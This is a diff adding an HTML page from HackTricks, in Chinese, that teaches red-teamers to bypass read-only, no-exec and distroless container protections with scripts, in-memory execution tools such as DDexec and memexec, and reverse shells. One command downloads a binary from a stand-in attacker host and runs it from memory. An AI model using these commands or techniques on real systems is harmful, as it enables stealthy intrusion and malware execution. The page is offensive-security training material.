@@ -1,0 +1,309 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Bypass FS protections: read-only / no-exec / Distroless</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="绕过文件系统保护只读--无执行--distroless"><a class="header" href="#绕过文件系统保护只读--无执行--distroless">绕过文件系统保护：只读 / 无执行 / Distroless</a></h1>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<p>如果你对 <strong>黑客职业</strong> 感兴趣并想要攻克不可攻克的目标 - <strong>我们正在招聘！</strong> (<em>需要流利的波兰语书写和口语能力</em>).</p>
+<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
+<h2 id="视频"><a class="header" href="#视频">视频</a></h2>
+<p>在以下视频中，你可以找到本页提到的技术的更深入解释：</p>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=poHirez8jk4"><strong>DEF CON 31 - 探索 Linux 内存操控以实现隐蔽和规避</strong></a></li>
+<li><a href="https://www.youtube.com/watch?v=VM_gjjiARaU"><strong>使用 DDexec-ng 和内存 dlopen() 的隐蔽入侵 - HackTricks Track 2023</strong></a></li>
+</ul>
+<h2 id="只读--无执行场景"><a class="header" href="#只读--无执行场景">只读 / 无执行场景</a></h2>
+<p>在 Linux 机器上发现 <strong>只读 (ro) 文件系统保护</strong> 的情况越来越普遍，特别是在容器中。这是因为运行一个只读文件系统的容器就像在 <code>securitycontext</code> 中设置 <strong><code>readOnlyRootFilesystem: true</code></strong> 一样简单：</p>
+<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
+kind: Pod
+metadata:
+name: alpine-pod
+spec:
+containers:
+- name: alpine
+image: alpine
+securityContext:
+<strong>      readOnlyRootFilesystem: true
+</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
+</code></pre>
+<p>然而，即使文件系统被挂载为只读，<strong><code>/dev/shm</code></strong> 仍然是可写的，因此我们不能写入磁盘的说法是错误的。然而，这个文件夹将会 <strong>以无执行保护的方式挂载</strong>，所以如果你在这里下载一个二进制文件，你 <strong>将无法执行它</strong>。</p>
+<p>{% hint style="warning" %}
+从红队的角度来看，这使得 <strong>下载和执行</strong> 系统中不存在的二进制文件（如后门或枚举工具如 <code>kubectl</code>）变得 <strong>复杂</strong>。
+{% endhint %}</p>
+<h2 id="最简单的绕过脚本"><a class="header" href="#最简单的绕过脚本">最简单的绕过：脚本</a></h2>
+<p>请注意，我提到的是二进制文件，只要解释器在机器内部，你可以 <strong>执行任何脚本</strong>，例如如果 <code>sh</code> 存在则可以执行 <strong>shell 脚本</strong>，或者如果安装了 <code>python</code> 则可以执行 <strong>python 脚本</strong>。</p>
+<p>然而，这并不足以执行你的二进制后门或其他你可能需要运行的二进制工具。</p>
+<h2 id="内存绕过"><a class="header" href="#内存绕过">内存绕过</a></h2>
+<p>如果你想执行一个二进制文件，但文件系统不允许这样做，最好的方法是 <strong>从内存中执行它</strong>，因为 <strong>保护措施不适用于内存</strong>。</p>
+<h3 id="fd--exec-系统调用绕过"><a class="header" href="#fd--exec-系统调用绕过">FD + exec 系统调用绕过</a></h3>
+<p>如果你在机器内部有一些强大的脚本引擎，例如 <strong>Python</strong>、<strong>Perl</strong> 或 <strong>Ruby</strong>，你可以将二进制文件下载到内存中执行，将其存储在一个内存文件描述符中（<code>create_memfd</code> 系统调用），这个描述符不会受到这些保护的影响，然后调用 <strong><code>exec</code> 系统调用</strong> 指定 <strong>fd 作为要执行的文件</strong>。</p>
+<p>为此，你可以轻松使用项目 <a href="https://github.com/nnsee/fileless-elf-exec"><strong>fileless-elf-exec</strong></a>。你可以传递一个二进制文件，它将生成一个指定语言的脚本，包含 <strong>压缩和 b64 编码的二进制文件</strong> 以及 <strong>解码和解压缩</strong> 的指令，存储在通过调用 <code>create_memfd</code> 系统调用创建的 <strong>fd</strong> 中，并调用 <strong>exec</strong> 系统调用来运行它。</p>
+<p>{% hint style="warning" %}
+这在其他脚本语言如 PHP 或 Node 中不起作用，因为它们没有任何 <strong>默认方式从脚本调用原始系统调用</strong>，因此无法调用 <code>create_memfd</code> 来创建 <strong>内存 fd</strong> 来存储二进制文件。</p>
+<p>此外，使用 <code>/dev/shm</code> 中的文件创建 <strong>常规 fd</strong> 也不起作用，因为你将无法运行它，因为 <strong>无执行保护</strong> 将适用。
+{% endhint %}</p>
+<h3 id="ddexec--everythingexec"><a class="header" href="#ddexec--everythingexec">DDexec / EverythingExec</a></h3>
+<p><a href="https://github.com/arget13/DDexec"><strong>DDexec / EverythingExec</strong></a> 是一种技术，允许你通过覆盖 <strong><code>/proc/self/mem</code></strong> 来 <strong>修改你自己进程的内存</strong>。</p>
+<p>因此，<strong>控制正在被进程执行的汇编代码</strong>，你可以编写 <strong>shellcode</strong> 并“变异”进程以 <strong>执行任何任意代码</strong>。</p>
+<p>{% hint style="success" %}
+<strong>DDexec / EverythingExec</strong> 将允许你从 <strong>内存</strong> 中加载和 <strong>执行</strong> 你自己的 <strong>shellcode</strong> 或 <strong>任何二进制文件</strong>。
+{% endhint %}</p>
+<pre><code class="language-bash"># Basic example
+wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
+</code></pre>
+<p>For more information about this technique check the Github or:</p>
+<p>{% content-ref url="ddexec.md" %}
+<a href="ddexec.html">ddexec.md</a>
+{% endcontent-ref %}</p>
+<h3 id="memexec"><a class="header" href="#memexec">MemExec</a></h3>
+<p><a href="https://github.com/arget13/memexec"><strong>Memexec</strong></a> 是 DDexec 的自然下一步。它是一个 <strong>DDexec shellcode demonised</strong>，因此每次您想要 <strong>运行不同的二进制文件</strong> 时，您无需重新启动 DDexec，只需通过 DDexec 技术运行 memexec shellcode，然后 <strong>与此守护进程通信以传递要加载和运行的新二进制文件</strong>。</p>
+<p>您可以在 <a href="https://github.com/arget13/memexec/blob/main/a.php">https://github.com/arget13/memexec/blob/main/a.php</a> 找到如何使用 <strong>memexec 从 PHP 反向 shell 执行二进制文件</strong> 的示例。</p>
+<h3 id="memdlopen"><a class="header" href="#memdlopen">Memdlopen</a></h3>
+<p>与 DDexec 具有相似目的的 <a href="https://github.com/arget13/memdlopen"><strong>memdlopen</strong></a> 技术允许以 <strong>更简单的方式加载二进制文件</strong> 到内存中以便稍后执行。它甚至可以加载带有依赖项的二进制文件。</p>
+<h2 id="distroless-bypass"><a class="header" href="#distroless-bypass">Distroless Bypass</a></h2>
+<h3 id="什么是-distroless"><a class="header" href="#什么是-distroless">什么是 distroless</a></h3>
+<p>Distroless 容器仅包含 <strong>运行特定应用程序或服务所需的最低组件</strong>，例如库和运行时依赖项，但排除了较大的组件，如包管理器、shell 或系统实用程序。</p>
+<p>distroless 容器的目标是 <strong>通过消除不必要的组件来减少容器的攻击面</strong>，并最小化可以被利用的漏洞数量。</p>
+<h3 id="反向-shell"><a class="header" href="#反向-shell">反向 Shell</a></h3>
+<p>在 distroless 容器中，您可能 <strong>甚至找不到 <code>sh</code> 或 <code>bash</code></strong> 来获取常规 shell。您也不会找到 <code>ls</code>、<code>whoami</code>、<code>id</code> 等二进制文件……您通常在系统中运行的所有内容。</p>
+<p>{% hint style="warning" %}
+因此，您 <strong>将无法</strong> 获取 <strong>反向 shell</strong> 或 <strong>枚举</strong> 系统，如您通常所做的那样。
+{% endhint %}</p>
+<p>然而，如果被攻陷的容器正在运行例如 flask web，那么 python 已安装，因此您可以获取 <strong>Python 反向 shell</strong>。如果它正在运行 node，您可以获取 Node 反向 shell，几乎任何 <strong>脚本语言</strong> 也是如此。</p>
+<p>{% hint style="success" %}
+使用脚本语言，您可以 <strong>使用语言功能枚举系统</strong>。
+{% endhint %}</p>
+<p>如果没有 <strong><code>read-only/no-exec</code></strong> 保护，您可以利用您的反向 shell <strong>在文件系统中写入您的二进制文件</strong> 并 <strong>执行</strong> 它们。</p>
+<p>{% hint style="success" %}
+然而，在这种类型的容器中，这些保护通常会存在，但您可以使用 <strong>先前的内存执行技术来绕过它们</strong>。
+{% endhint %}</p>
+<p>您可以在 <a href="https://github.com/carlospolop/DistrolessRCE"><strong>https://github.com/carlospolop/DistrolessRCE</strong></a> 找到 <strong>示例</strong>，了解如何 <strong>利用一些 RCE 漏洞</strong> 获取脚本语言的 <strong>反向 shell</strong> 并从内存中执行二进制文件。</p>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<p>如果您对 <strong>黑客职业</strong> 感兴趣并想要攻克不可攻克的目标 - <strong>我们正在招聘！</strong> (<em>需要流利的波兰语书写和口语能力</em>).</p>
+<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../linux-hardening/bypass-bash-restrictions/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../linux-hardening/bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/ddexec.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../linux-hardening/bypass-bash-restrictions/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../linux-hardening/bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/ddexec.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
